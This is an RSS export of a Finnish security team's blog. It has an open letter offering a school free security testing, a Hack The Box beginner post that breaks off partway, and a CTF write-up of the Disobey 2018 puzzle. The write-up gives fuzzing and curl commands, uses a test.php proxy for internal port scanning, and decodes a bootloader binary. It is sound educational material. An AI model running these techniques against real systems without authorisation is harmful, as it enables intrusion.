<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Uncategorized &#8211; Team ROT Information Security</title>
	<atom:link href="/category/uncategorized/feed/" rel="self" type="application/rss+xml" />
	<link>/</link>
	<description>Team ROT Information Security</description>
	<lastBuildDate>Sat, 29 Aug 2020 10:51:44 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.2</generator>

<image>
	<url>/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-32x32.png</url>
	<title>Uncategorized &#8211; Team ROT Information Security</title>
	<link>/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>Team ROTin #kouluhaaste</title>
		<link>/team-rotin-kouluhaaste/</link>
		
		<dc:creator><![CDATA[woltage]]></dc:creator>
		<pubDate>Mon, 11 Mar 2019 04:51:06 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">/?p=1527</guid>

					<description><![CDATA[Tämän avoimen kirjeen on tarkoitus tavoittaa yliopistojen, ammattikorkeakoulujen, lukioiden ja ammattikoulujen tietoturvasta päättävät henkilöt. Team ROT tarjoaa yhdelle Suomalaiselle koululle ilmaisen teknisen tietoturvatestauksen.]]></description>
										<content:encoded><![CDATA[
<p></p>


<p><span style="font-weight: 400;">Tämän avoimen kirjeen on tarkoitus tavoittaa yliopistojen, ammattikorkeakoulujen, lukioiden ja ammattikoulujen tietoturvasta päättävät henkilöt. Team ROT tarjoaa yhdelle Suomalaiselle koululle ilmaisen teknisen tietoturvatestauksen.</span><br />
<span style="font-weight: 400;">Olemme Team ROT, meitä on kuusi henkilöä ja tietoturva on intohimomme. Teemme teknisiä tietoturvatestauksia järjestelmiin ja laitteistoihin, sekä vapaa-ajallamme, että päivätyöksemme. Olemme osallistuneet lukuisiin haavoittuvuuspalkinto-ohjelmiin (engl. “Bug Bounty program”) maailmanlaajuisesti ja tiimimme jäsenet ovatkin tunnettuja myös kansainvälisesti. Nyt haluamme parantaa Suomen koulujen tietoturvallisuutta ja haluamme tarjota yhdelle Suomen koululle ilmaisen työpanoksemme, jotta Suomi ja suomalaisten koulujen järjestelmät saadaan turvallisemmaksi.</span><br />
<span style="font-weight: 400;">Team ROT järjesti vuonna 2017 #kuntahaaste -kampanjan, jossa tekemällämme työpanoksella paransimme Suomalaisten kuntien tietoturvallisuutta. Vuonna 2018 osallistuimme Visman järjestämään Visma Hackday -tapahtumaan, jossa testattiin useiden koulujen käyttämän Wilma-järjestelmän tietoturvallisuutta (<a href="https://www.visma.fi/blog/visma-hackday-suomi-ruotsi-maaottelu/">https://www.visma.fi/blog/visma-hackday-suomi-ruotsi-maaottelu/</a>). Nyt haluammekin jatkaa tällä Suomalaisten koulujen tietojärjestelmien tietoturvallisuutta edistävällä tiellä, ja olemmekin päättäneet lanseerata #kouluhaaste -kampanjan.</span><br />
<b>Pyydämme halukkaita kouluja ilmoittautumaan mukaan #kouluhaaste -kampanjaan huhtikuun 2019 loppuun mennessä lähettämällä vapaamuotoisen ilmoittautumisen sähköpostiosoitteeseen <a href="mailto:team@rot.fi">team@rot.fi</a></b><span style="font-weight: 400;">. Team ROT valitsee halukkaiden koulujen joukosta yhden koulun, johon tietoturvatestaus suoritetaan. Testaus sisältää teknisen tietoturvatestauksen, joka suoritetaan Team ROT -jäsenten toimesta valitun koulun järjestelmiin yhden, vielä määrittelemättömän viikonlopun aikana. Team ROT kontaktoi valittua koulua toukokuun 2019 alkupuolella.</span><br />
<b>Tietoa testausprosessista</b><br />
<span style="font-weight: 400;">Jotta tietoturvatestaus olisi mahdollisimman sujuva ja reilu molemmille osapuolille, koulu voi määritellä itse halutun kohteen tai kohteet sekä halutessa rajata tietyt testitapaukset pois testauksesta. Team ROT kuitenkin suosittelee, että testauksen kohteena olisi mukana mahdollisimman laaja osa koulun järjestelmiä. Näin ollen koulu hyötyy Team ROT:in tekemästä työstä mahdollisimman laajasti.</span><br />
<span style="font-weight: 400;">Testausaikana Team ROT pyrkii olemaan aiheuttamatta ongelmia kohdejärjestelmien saatavuuden, eheyden ja luottamuksellisuuden kanssa, mutta kuten kaikessa testauksessa, odottamattomia ongelmia voi esiintyä. Täten Team ROT ei ota vastuuta mahdollisista ongelmista, jotka testaus suorasti tai epäsuorasti voi aiheuttaa. Team ROT suosittelee, että testaus suoritetaan sellaisena ajankohtana jolloin mahdollisista esiintyvistä ongelmista aiheutuu mahdollisimman vähän haittaa koulun normaalille toiminnalle, esim. testaus suoritetaan viikonloppuna koulun loma-aikana.</span><br />
<span style="font-weight: 400;">Testauksen lopputuotoksena kirjoitetaan raportti, jossa raportoidaan kaikki testauksen aikana havaitut tietoturvaongelmat. Raportti toimitetaan koulun tietoturvatestaukseen valitulle yhteyshenkilölle, yleensä koulun tietoturvavastaavalle. Jos havainto koskee koulun ulkopuolista organisaatiota tai kolmannen osapuolen toimittajan sovellusta, Team ROT ilmoittaa havainnoista myös Traficomin kyberturvallisuuskeskukselle, CERT-FI:lle. Tämä sen takia, että haavoittuvuuskoordinointi kolmansien osapuolten kanssa onnistuisi mahdollisimman sujuvasti. Kun raportoidut havainnot ovat korjattu, Team ROT julkaisee niistä yhteenvedon. Yhteenveto käydään lävitse ennen sen julkaisemista yhdessä koulun kanssa ja sisällöstä poistetaan osapuolten halujen mukaisesti luottamuksellinen ja/tai yksilöivä tieto.</span><br />
<span style="font-weight: 400;">Team ROT pidättää oikeuden julkaista tiedon haavoittuvuuksien kokonaismäärästä jo ennen tietoturvahaavoittuvuuksien korjaamista, mutta tarkempia tietoja haavoittuvuuksista tai osallistuvaa koulun nimeä ei julkaista ennen tietoturvahaavoittuvuuksien korjaamista tai erillistä testattavan koulun antamaa kirjallista lupaa.</span><br />
<span style="font-weight: 400;">Terveisin,<br />
</span><strong>Team ROT</strong><br />
<span style="font-weight: 400;">Team ROTia #kouluhaaste’eessa tukemassa:</span><br />
<a href="https://www.visma.fi/"><img decoding="async" class=" alignnone" src="https://upload.wikimedia.org/wikipedia/fi/thumb/2/2b/Visma_logo.svg/1280px-Visma_logo.svg.png" alt="Image result for visma logo" width="219" height="41"></a><br />
<a style="background-color: #ffffff; box-shadow: 0 0 0 1px rgba(var(--color-primary-rgb), 0.2);" href="https://www.solita.fi/"><img decoding="async" class=" alignnone" src="https://www.movesense.com/wp-content/uploads/2018/11/Solita-logo-transparent.png" alt="Image result for solita logo" width="218" height="51"></a><br />
<a href="https://www.elisa.fi/"><img decoding="async" class=" alignnone" src="https://corporate.elisa.fi/img/logot/Elisa_logo_blue_RGB.png" alt="Image result for elisa logo" width="156" height="110"></a></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Solving the Disobey 2018 puzzle</title>
		<link>/solving-the-disobey-2018-puzzle/</link>
		
		<dc:creator><![CDATA[lokori]]></dc:creator>
		<pubDate>Mon, 17 Sep 2018 07:42:57 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">https://rot.fi/?p=1414</guid>

					<description><![CDATA[This is a writeup for the Disobey 2018 hacker ticket puzzle. There were 50 "hacker" tickets available and the puzzle was open for about a month. It was a bit tougher this time than it was in previous years.]]></description>
										<content:encoded><![CDATA[<p>This is a writeup for the <a href="https://disobey.fi/">Disobey 2018 </a>hacker ticket puzzle. There were 50 &#8220;hacker&#8221; tickets available and the puzzle was open for about a month. It was a bit tougher this time than it was in previous years.</p>
<h2>Spoiler alert</h2>
<p><strong><span style="color: #ff0000;">WARNING: This obviously CONTAINS SPOILERS.</span> </strong>Do not read further if you want to solve it yourself! And you should try (harder)!</p>
<hr>
<p>It began with the URL&nbsp;<a href="http://puzzle.disobey.fi/">http://puzzle.disobey.fi/</a>.</p>
<h2>Quick recon</h2>
<p>First thing I&#8217;m used to doing is recon with <strong><em>nmap</em></strong></p>
<blockquote><p>nmap -v -sC -sV -oA initial_nmap puzzle.disobey.fi</p></blockquote>
<p>This quickly revealed two webservers. The other one only replied &#8220;Try harder&#8221;, a good tip indeed.<br />
The other one had a standard nginx web page.<br />
<img decoding="async" class="alignnone size-full wp-image-1417" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09.png" alt="Screen Shot 2018-09-17 at 10.47.09" width="2492" height="736" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09.png 2492w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-300x89.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1030x304.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-768x227.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1536x454.png 1536w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-2048x605.png 2048w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1500x443.png 1500w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-705x208.png 705w" sizes="(max-width: 2492px) 100vw, 2492px" /><br />
HTML source for the test page reveals there&#8217;s a resource <strong><em>lorem.html</em></strong>&nbsp;. So I downloaded that, but what to do with the seemingly standard &#8220;lorem ipsum&#8221; stuff?<br />
At the same time, my standard approach to <a href="https://www.hackthebox.eu/">HackTheBox</a> is to crawl for additional hidden resources left &#8220;accidentally&#8221; in the web server. So <em><strong>nikto</strong></em> + <em><strong>dirb</strong></em> + <em><strong>gobuster</strong></em> it is.<br />
My normal HTB enumerator uses Kali linux standard lists and some additional ones from the <a href="https://github.com/danielmiessler/SecLists">SecLists</a>.<br />
https://gist.github.com/lokori/3ba0a98ab9cf9f1b17f83151295c666a<br />
This crawling revealed <em><strong>.bash_history</strong></em> which lead to an SQL file, but that didn&#8217;t lead to&nbsp; anything interesting.<br />
So, back to lorem.html. With this kind of puzzle it&#8217;s important to remember that everything is not relevant to the solution, but the relevant hints and resources are provided in the puzzle. I need to remind myself of that when I get stuck.</p>
<h2>lorem lorem lorem</h2>
<p>Cut it into separate words.</p>
<blockquote><p>cat pier.sh<br />
#!/bin/bash<br />
for word in $(&lt;lorem.html)<br />
do<br />
echo &#8220;$word&#8221;<br />
done<br />
./pier.sh &lt; lorem.html | sed s/[\.,]//g|sort|uniq &gt; lorems.txt</p></blockquote>
<p>and then</p>
<blockquote><p>cat lorems.txt |xargs -I {} curl -O &#8216;http://puzzle.disobey.fi/{}&#8217;</p></blockquote>
<p>Now we get</p>
<blockquote><p>ls -laS<br />
-rw-r&#8211;r&#8211; 1 root root 3650 Aug 2 09:08 vulputate<br />
-rw-r&#8211;r&#8211; 1 root root 1421 Aug 2 09:07 lorems.txt<br />
-rw-r&#8211;r&#8211; 1 root root 11 Aug 2 09:08 Interdum</p></blockquote>
<p>Okay.. clearly one reply is very different!<br />
It says: <em><strong>&#8220;Wrong vhost&#8221;</strong></em><br />
ok, so let&#8217;s <em><strong>curl</strong></em> again with another vhost?</p>
<blockquote><p>curl &#8211;header &#8216;Host: julli.disobey.fi&#8217; http://puzzle.disobey.fi/Interdum<br />
Try harder &#8211; admin</p></blockquote>
<p>So this seems kind of promising, but what is the proper virtual host?<br />
Not one of these.</p>
<blockquote><p>cat lorems.txt |xargs -I {} curl -o {} &#8211;header &#8216;Host: {}.disobey.fi&#8217; &#8216;http://puzzle.disobey.fi/Interdum&#8217;</p></blockquote>
<p>It took a while, but the answer was not very complicated after all.</p>
<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; http://puzzle.disobey.fi/Interdum<br />
Greetings! Love you &lt;3 &#8211; I need -love also</p></blockquote>
<p>Okay, let&#8217;s make some &#8220;-love&#8221; then..</p>
<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; http://puzzle.disobey.fi/Interdum-love</p></blockquote>
<h2>Secrets</h2>
<p>Now we find a nice text file.</p>
<blockquote><p>cat secret.txt<br />
Hi John!<br />
Here is that secret email &#8211; encrypted with your favorite PIN-code!<br />
SnVzdCBraWRkaW5nIC0gYmFzZTY0IGlzIGF3ZXNvbWUu</p></blockquote>
<p>Base64 decode says <em><strong>&#8220;Just kidding &#8211; base64 is awesome.&#8221;</strong></em><br />
Heh. Hah. Hoh. We still have test.php there. It is a small file so it can&#8217;t be very complicated to exploit it and it&#8217;s the only lead we have now.<br />
Perhaps there is a parameter that is exploitable, but what is the parameter name?&nbsp; There is <a href="https://github.com/xmendez/wfuzz"><em><strong>wfuzz</strong></em></a>, but let&#8217;s be old school.</p>
<blockquote><p>cat /root/tools/SecLists/Discovery/DNS/namelist.txt |xargs -I {} curl &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?{}=123&#8217;</p></blockquote>
<p>Still no luck. At this point I was very frustrated and angry at myself.</p>
<h2>Black hat Python</h2>
<p>When I get frustrated in this way I usually write some Python to take full control of the issue. So, I wrote this one-time piece.<br />
<img decoding="async" class="alignnone size-full wp-image-1426" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50.png" alt="Screen Shot 2018-09-20 at 9.23.50.png" width="1290" height="1312" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50.png 1290w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-295x300.png 295w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-1013x1030.png 1013w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-80x80.png 80w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-768x781.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-36x36.png 36w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-693x705.png 693w" sizes="(max-width: 1290px) 100vw, 1290px" /><br />
<span style="background-color: #ffffff; color: #3d596d;">This tries sufficiently different values for each parameter name candidate. Given the proper word lists this finally found the parameter name, which was simply &#8220;url&#8221;.</span><br />
How to exploit that?<br />
Randomly trying some numbers.</p>
<blockquote><p>curl -v &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=1234561251&#8217;* Trying 185.86.149.26&#8230;</p></blockquote>
<p>Resulted in &#8220;504 Gateway Time-out&#8221;. Hmm.</p>
<blockquote><p>curl -v &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=213070643/index.html&#8217;</p></blockquote>
<p>Gave out &#8221;&nbsp;HTTP/1.1 403 WAF&#8221;.<br />
It&#8217;s a HTTP proxy! The numbers in the URL can be translated into IP addresses which enables us proxy GET requests. Let&#8217;s try the other web server in the puzzle machine through this (as the call comes from the localhost, it might behave differently):</p>
<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=0:8021%2f2&#8217;</p></blockquote>
<p>And in fact, it does! There is a one character different in the reply &#8220;Try harder!1&#8221; vs. &#8220;Try harder!&#8221; but this doesn&#8217;t lead to anything interesting.</p>
<h2>Proxy as a port scanner</h2>
<p>This is one of the standard tricks &#8211; if there is an open proxy, it can be used to scan the internal network for ports and services not directly accessible from the outside. Let&#8217;s go!<br />
Very crude scanner in Python.<br />
<img decoding="async" class="alignnone size-full wp-image-1427" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35.png" alt="Screen Shot 2018-09-20 at 9.28.35.png" width="1164" height="662" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35.png 1164w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-300x171.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-1030x586.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-768x437.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-705x401.png 705w" sizes="(max-width: 1164px) 100vw, 1164px" /><br />
We find SSH server and.. finally, something very interesting came up!</p>
<blockquote><p>FOUND !! 0:40053 // 51<br />
H4sIAI5uYVsAA+3STUgUURwA8Oe2OyyGHyF4qMtb6KAXm+eubq7rmq5bFuWaHxGWyrrO5ObuzjI7Yx+o+47mQTp16rRHE9HwEBjjhjVUsBHdqktQxtQgSpgHE+utRkGEdBEJ/j8Y3vzn//HewOuTJCUqhfoFGe0ZnuerXS6cW93VVdsrX7kTM4QnboKJ0+nkK6vdlTzBPHHyLjfC/N4d6Tc1qYRkdpRBV4zsVsfKRHGX/M7P4F/rf+KzbRihzY2x0vYUyZC35Bl5RdbJd7L8EA1PvJzITLybML7No9FxVsAv8+uzlgUbmrPMHMiWyHalZDZv64m5zH/IlgTVj9rVlPHe8ule3n7/FPhHnZMiyYi1HJJN28pGVHeszmDroXQN9XAeqqDoVibtoSZq17la6tQ5L60wLV36NJ+xYmtxuo6lVnXORyvS9VTnTuSy01svrLZ0AwsbqUfn/PS4zjVRXucCtFLnTlKyUEONFqT1poznSBtNGY/RwlFq3ETU56IN6jHqq6J+tYz6qmmj6qA+N21SD2v3U8ZdpLG6O0hzUOM20t6kjHG0saYtpYwEoiMWp+rUAxY3HbETpVwP2IkeKKzXA0V1P2/1umaj80XIP+VFir3s6dajsTzzy+KDFW1jbQ5lS7125aC3QDkyV5gtnjSXgzq75IUz9mzxDGYPW83XLC5g7/nZ4sXOW0sXtI6UYUc9hpWdwtycsmcULtdsfl1ElxzduLWh5bQfozZJVQQcbM8vQE2R5CCWhVA/FkORqNDvYN9aZen6DZwU5CFBxoqE1aSARUnGoqCEByLxK1hklUlcJiWUiBQPRcs9GPmleFwI5+JcRywiy7mG7ZF4KBLCidxMVtcciipsRAXbJsjGi1HpGi7zDwjhwaQaY33JWIhtUo5Z/tSZi83hs8HucwPnO/raYpc7E73RZKS3K9wTRyz9pwZ/Y9M+XFYAAAAAAAAAAAAAAAAAAAAAAAAAAPAXPwDTbo0GACgAAA==1</p></blockquote>
<p>So what is this?</p>
<blockquote><p>cat pokale.txt | base64 -d &gt; pokale.bin<br />
file pokale.bin<br />
pokale.bin: gzip compressed data, last modified: Wed Aug 1 08:25:50 2018, from Unix</p></blockquote>
<p>Ok, so a zip file. Our next step obviously.</p>
<h2>Mystery binary</h2>
<p>First standard thing is to run <em><strong>strings.</strong></em></p>
<blockquote><p>bootloader<br />
000644<br />
000765<br />
000024<br />
00000010171 13330267201 013047<br />
ustar<br />
00k4m1<br />
staff<br />
000000<br />
000000<br />
[!] PANIC<br />
Route OS<br />
Disk read failed!<br />
Proxy server to use for fetching files (optional):<br />
Connection to mirror failed via proxy:<br />
Halting.<br />
Overflow (Checksum mismatch)<br />
GJXHcLO]MhQTbRm\Up_lsi_Zc^n<br />
ACBD</p></blockquote>
<p>So a bootloader, but two strings are interesting. <em><strong>&#8220;00k4m1&#8221;</strong></em>&nbsp;means the <a href="https://twitter.com/_k4m1_">great k4m1</a> has signed this binary! In the end,&nbsp;<em><strong>&#8220;GJXHcLO]MhQTbRm\Up_lsi_Zc^n&#8221;</strong></em>&nbsp;is very likely a decryption key or some secret we have to dissect.<br />
Let&#8217;s try a shortcut.<br />
<img decoding="async" class="alignnone size-full wp-image-1428" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37.png" alt="Screen Shot 2018-09-20 at 9.30.37.png" width="1014" height="618" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37.png 1014w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-300x183.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-768x468.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-705x430.png 705w" sizes="(max-width: 1014px) 100vw, 1014px" /><br />
Sometimes we could be lucky, but not today. So let&#8217;s look at the binary, properly.<br />
There is nothing wrong with <a href="https://rada.re/r/">radare2</a> but I used <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA free</a> in the end. I didn&#8217;t actually run the bootloader code at all. I just analyzed it and figured out what it does without stepping and debugging. The initial guess was correct &#8211; we need to decrypt the weird string, but it just wasn&#8217;t simple XOR.<br />
<img decoding="async" class="alignnone size-full wp-image-1419" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25.png" alt="Screen Shot 2018-08-06 at 16.40.25.png" width="680" height="612" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25.png 680w, /wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25-300x270.png 300w" sizes="(max-width: 680px) 100vw, 680px" /><br />
Replicating the &#8220;decryption&#8221; algorithm in Python we get something sensible out of it:<br />
<img decoding="async" class="alignnone size-full wp-image-1420" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07.png" alt="Screen Shot 2018-09-17 at 11.28.07.png" width="828" height="534" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07.png 828w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-300x193.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-768x495.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-705x455.png 705w" sizes="(max-width: 828px) 100vw, 828px" /><br />
The binary also points towards the other web server we found with the nmap so clearly we need to do something there, but there is no clear URL that gives us the ticket.</p>
<h2>Alternate solution to binary</h2>
<p>This is from another ROT member, Jarkko Vesiluoma:</p>
<blockquote><p>cat something.base64 |base64 -d &gt; bootloader.gz<br />
$ file ../bootloader2<br />
../bootloader2: gzip compressed data, last modified: Wed Aug 1 08:25:50 2018, from Unix<br />
$ file bootloader.raw<br />
bootloader.raw: DOS/MBR boot sector<br />
qemu-system-x86_64 -k fi -drive format=raw,file=bootloader.raw -s<br />
other terminal: r2 -D gdb gdb://localhost:1234<br />
In r2: vvv and then qq</p></blockquote>
<p>Basically the memory of the running bootloader is accessed to get the decrypted value. It&#8217;s running inside a virtual machine so this is easy. In a way this is &#8220;cheating&#8221;, but this is a nice way to analyze an unknown binary, as long as potentially harmful actions are contained inside the virtual machine.</p>
<h2>The final insult</h2>
<p>Manual guessing is frustrating..</p>
<blockquote><p>Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;<br />
Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?ACBD=GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;<br />
Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?GIVE_GIVE_GIVE_ME_MY_TICKET=ACBD&#8221;<br />
Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;</p></blockquote>
<p>So Python it is again! I was getting really worked up at this point after all this effort. How many times do I need to &#8220;try harder&#8221; to get the ticket?<br />
<img decoding="async" class="alignnone size-full wp-image-1429" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50.png" alt="Screen Shot 2018-09-20 at 9.31.50.png" width="1616" height="1058" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50.png 1616w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-300x196.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1030x674.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-768x503.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1536x1006.png 1536w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1500x982.png 1500w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-705x462.png 705w" sizes="(max-width: 1616px) 100vw, 1616px" /></p>
<p>We still need to find the right parameter list, but there is a reasonable one from the SecLists at our disposal.</p>
<blockquote><p>python final_insult.py /root/tools/SecLists/Discovery/Web_Content/burp-parameter-names.txt<br />
using word list /root/tools/SecLists/Discovery/Web_Content/burp-parameter-names.txt<br />
FOUND !!data<br />
HACKER! https://holvi.com/shop/Disobey/product/c995bdab7374d27f1250f1071c4a9b07/</p></blockquote>
<p>So finally! There is a ticket.<br />
<img decoding="async" class="alignnone size-full wp-image-1422" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18.png" alt="Screen Shot 2018-08-06 at 16.24.18.png" width="483" height="146" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18.png 483w, /wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18-300x91.png 300w" sizes="(max-width: 483px) 100vw, 483px" /><br />
You could have also done it with something like this using <em><strong>wfuzz</strong></em>:</p>
<blockquote><p>wfuzz -c -z file,Web-Content/raft-large-words.txt &#8211;filter &#8220;c=200 and h&gt;11&#8221; -f disobey.1 -Z -H &#8216;Host: admin&#8217; http://puzzle.disobey.fi:8021/?FUZZ=GIVE_GIVE_GIVE_ME_MY_TICKET</p></blockquote>
<h2>Closing words</h2>
<p>I got really frustrated at some points during this process, but luckily I got some motivational push from other team ROT members (thank you Jarkko and Putsi). We solved this on our own, without really co-operating together, but it still helped to me to know that I&#8217;m wandering roughly to the right direction. Our solutions were different in the end as I like writing Python scripts when things get difficult. The other ROT guys are perhaps slightly more tool oriented.<br />
I really liked the binary challenge part and overall I think the difficulty level was correct.&nbsp; It wasn&#8217;t too easy to get the hacker ticket, but perfectly doable for a motivated hacker.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Hack The Box for fun!</title>
		<link>/1274/</link>
		
		<dc:creator><![CDATA[lokori]]></dc:creator>
		<pubDate>Thu, 08 Mar 2018 12:17:07 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">https://rot.fi/?p=1274</guid>

					<description><![CDATA[Fun experiences with Hack The Box and some advice for aspiring  hackers to get things going.]]></description>
										<content:encoded><![CDATA[<h1>What is Hack The Box ?</h1>
<p>A week ago I started hacking virtual machines and challenges at&nbsp;<a href="https://www.hackthebox.eu/">Hackthebox.eu</a>&nbsp;and it has been a lot of fun. <strong>Hack The Box</strong>&nbsp;provides it&#8217;s users with a virtual environment with dedicated vulnerable machines and some CTF-style challenges. This post contains some pointers and introductory tips for aspiring would-be hackers, but no spoilers and you still need to solve the invitation code.<br />
At my day job I try to ensure that the software we produce is secure. Sometimes it involves doing penetration testing, but I&#8217;m not doing the fancy Red Teaming stuff at all. If I find technical security flaws or process issues, they are fixed and there&#8217;s rarely any public disclosure.&nbsp; There might be a review and retrospective, but no one pays me to chain cool ROP gadgets to&nbsp;prove that a buffer overflow can be very dangerous. Now&nbsp;<a href="https://www.hackthebox.eu/">Hackthebox.eu</a>&nbsp;has provided me with an excuse to do that other kind of hacking too.</p>
<h1>How to get started?</h1>
<p>You&#8217;ll need some basic tools. <a href="https://www.kali.org/">Kali Linux</a> in a virtual machine and some HTTP proxy (<a href="https://portswigger.net/burp">Burp</a> or <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">ZAP</a>) are sufficient for most of the things. Inside Kali, <strong><em>nmap</em></strong>, <em><strong>dirb</strong></em>, <em><strong>nikto</strong></em> and <a href="https://www.metasploit.com/">Metasploit</a> have been my most useful tools so far.<br />
To get an idea about the hacking (as well as some tips), watch <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec&#8217;s great videos</a> about pwning the retired machines. For example, watch the&nbsp;&nbsp;<a href="https://www.youtube.com/watch?v=NMGsnPSm8iw">video about pwning Popcorn</a>.</p>
<h1>Pwning machines</h1>
<p>It appears that first you need to recon the machine by running <em><strong>nmap</strong></em> and <strong><em>dirb</em></strong> and other scanners to find something exploitable. Often it&#8217;s a web application, but it can be something else too. When you find &#8220;something&#8221;, try to exploit it somehow. Get some ideas about how to find &amp; exploit that &#8220;something&#8221; from <em>High on Coffee</em>:&nbsp;<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">penetration testing cheat sheet.</a><br />
I&#8217;m not a huge fan of having to guess something artificial, but that&#8217;s not totally unrealistic. I&#8217;m not very good at that it seems, but hopefully I&#8217;ll get better. Just keep in mind, there are steps where you may need to simply guess something.</p>
<h2>Getting from user to root</h2>
<p>I suck at pwning Windows machines, which is something I intend to practice next, but<br />
these links offer some ideas for the Linux/Unix systems:<br />
<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ </a><a href="https://www.rebootuser.com/?p=1758">https://www.rebootuser.com/?p=1758</a><br />
